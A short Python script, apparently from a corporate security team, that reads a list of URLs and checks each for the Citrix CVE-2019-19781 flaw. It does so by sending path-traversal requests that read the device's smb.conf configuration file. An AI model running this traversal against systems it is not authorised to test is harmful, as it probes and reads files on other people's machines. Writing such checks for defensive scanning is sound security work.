#coding=utf-8

"""
@author: Security Team, JS-Telecom corp.
@date: 2020/01/10
"""
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def vul():
	"""
	target::url.txt, format http://xxx:port/ or https://xxx:port/
	"""
	f = open("url.txt","r")
	res = open("vul.txt","a+")
	fail = open("log.txt","w+")
	uri1 = "/vpn/../vpns/cfg/smb.conf"
	uri2 = "/vpn/../vpns/services.html"
	for i in f.readlines():
		try:
			rq1 = requests.get(i.replace("\n","")+uri1,verify=False)
			rq2 = requests.get(i.replace("\n","")+uri2,verify=False)
			#print i.replace("\n","")+uri1
			if ((rq1.status_code == 200) or (rq2.status_code == 200)) and (("lmhosts" in rq1.content) or ("lmhosts" in rq2.content)):
				print(i+" is CVE-2019-19781 vulnerable!")
				res.write(i.replace("\n","")+",CVE-2019-19781 vulnerable")
			else:
				print(i+" is not CVE-2019-19781 vulnerable!")
		except:
			print(i.replace("\n","")+" error!")
			fail.write(i.replace("\n","")+" error!")
	f.close()
	res.close()
	fail.close()
	
if __name__=="__main__":
	vul()
